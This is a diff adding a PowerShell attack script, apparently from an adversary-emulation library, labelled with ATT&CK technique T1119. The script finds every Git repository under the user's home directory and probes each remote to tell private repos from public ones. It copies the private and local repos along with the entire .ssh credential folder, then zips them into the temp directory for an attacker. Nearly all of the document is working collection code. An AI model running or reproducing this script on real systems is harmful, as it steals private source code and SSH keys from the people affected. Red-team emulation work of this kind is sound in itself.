@@ -1,0 +1,153 @@
+#Title: repo_collector
+#Technique: T1119
+#Tactic: TA0009
+function Repo-Collector {
+    <#
+    ## .SYNOPSIS
+    ## Collects all private or local repositories on the system that use Git
+    ## for source-code management.
+    ## 
+    ## .DESCRIPTION
+    ## Copies all private or local repositories on the system that use Git
+    ## for source-code management to the path provided by the $collection_dir_location
+    ## parameter, and compresses the collected content into repo_collect_comp.zip.
+    ## 
+    ## .PARAMETER collection_dir_location
+    ## Provides the location of the directory where the attacker/s can find the
+    ## collected repositories.
+    ## 
+    ## .IMPORTANT
+    ## Attack Commands: Run with command_prompt! Elevation Required (e.g. root or admin)
+    ## 
+    ## .LINK
+    ## This is the original code.
+    #>
+
+    param (
+        [Parameter(Mandatory=$true)]
+        [String] $collection_dir_location
+    )
+
+    <#
+    ## Copy-Repo checks for a .gitignore file. If it exists, all the exclusions are
+    ## assiged to $excl so that those files are ignored when copying.
+    ## Then, a folder named after the $id variable is created inside the collection
+    ## directory.
+    ## Finally, all non-excluded files in the repo are copied to the newly
+    ## created directory.
+    #>
+    function Copy-Repo {
+        param (
+            [Parameter(Mandatory = $True)]
+            [String] $id,
+            [Parameter(Mandatory = $True)]
+            [String] $repo_path
+        )
+
+        $excl = ""
+
+        if (Test-Path .\.gitignore) {
+            $excl = Get-Content .\.gitignore
+        }
+        New-Item -Path $collection_dir_location\repo_collect\repos -Name "$id" -ItemType "directory"
+        Copy-Item -Path $repo_path\* -Destination $collection_dir_location\repo_collect\repos\$id -Exclude $excl -Recurse
+    }
+
+    $good = $False
+    $result = "Collection failed."
+
+    # Fail execution if invalid directory path is provided
+    $valid_location = Test-Path $collection_dir_location
+    if (!$valid_location) {
+        $result = "Invalid collection_dir_location"
+        return @{results=$result;success=$good}
+    }
+
+    # Create collection directories.
+    # copied_remote_repos.txt is used as a db for avoiding repeated repo copies.
+    New-Item -Path ~ -Name "copied_remote_repos.txt" -ItemType "file" -Value ""
+    New-Item -Path $collection_dir_location -Name "repo_collect" -ItemType "directory"
+    New-Item -Path $collection_dir_location\repo_collect -Name "repos" -ItemType "directory"
+    $id = 0
+
+    # Get the location of all git repos and iterate over each one of them
+    Get-ChildItem -Path ~ -Recurse -Name -Hidden -Include .git | ForEach-Object {
+        ++$id
+        $repo_path = "~\" + $_ + "\.."
+        Set-Location $repo_path
+        $raw_url = ""
+
+        # Get remote url of git repo, if it exists.
+        try {
+            $raw_url = git config --get remote.origin.url
+        }
+        catch {
+            Write-Output "Local repo"
+        }
+
+        # If the remote url does not exist, the repo is local, so it is copied.
+        if (!$raw_url) {
+            Copy-Repo -id $id -repo_path $repo_path
+            Write-Output "Local repo"
+            return
+        }
+
+        # Check if a repo with that same remote url was copied already, 
+        # and go to the next git repo if it was.
+        if (Select-String -Path ~\copied_remote_repos.txt -Pattern $raw_url) {
+            return
+        }
+
+        # Add remote url to copied_remote_repos.txt to avoid repeated copies.
+        Add-Content -Path ~\copied_remote_repos.txt -Value $raw_url
+
+        # Construct https url if the remote url is SSH, and make a web request
+        # to check if the repo is private or public. Only private repos are copied.
+        $url = $raw_url
+        if ($raw_url.IndexOf("@") -ne -1) {
+            $at_pos = $raw_url.IndexOf("@")
+            $col_pos = $raw_url.IndexOf(":")
+            $dom = $raw_url.Substring($at_pos, $col_pos - $at_pos - 1)
+            $route = $raw_url.Substring($col_pos, $raw_url.Length - 4 - $col_pos)
+            $url = "https://" + $dom + $route
+        }
+        try {
+            Invoke-WebRequest -Uri $url -UseBasicParsing
+        }
+        catch {
+            Copy-Repo -id $id -repo_path $repo_path
+            Write-Output "Private repo"
+        }
+    }
+    Remove-Item -Path ~\copied_remote_repos.txt
+
+    # If .ssh is present in the system, copy all of its contents.
+    if (Test-Path ~\.ssh) {
+        Copy-Item -Path ~\.ssh -Destination $collection_dir_location\repo_collect -Recurse -Force
+    }
+
+    # If any repos or ssh credentials were collected, compress the collection directory.
+    if (Test-Path $collection_dir_location\repo_collect) {
+        $compress = @{
+            Path = "$collection_dir_location\repo_collect"
+            CompressionLevel = "Optimal"
+            DestinationPath = "$collection_dir_location\repo_collect_comp.zip"
+        }
+        Compress-Archive @compress
+        Remove-Item -Path $collection_dir_location\repo_collect -Recurse -Force
+    }
+    Set-Location ~
+    if (Test-Path $collection_dir_location\repo_collect_comp.zip) {
+        $good = $True
+        $result = "Content saved in $collection_dir_location\repo_collect_comp.zip"
+    }
+    return @{results=$result;success=$good}
+}
+
+#Main program
+$execute = {}
+
+#Call repo-collector 
+$execute = Repo-Collector -collection_dir_location $Env:TEMP
+
+return @{results=$execute.results;success=$execute.success}
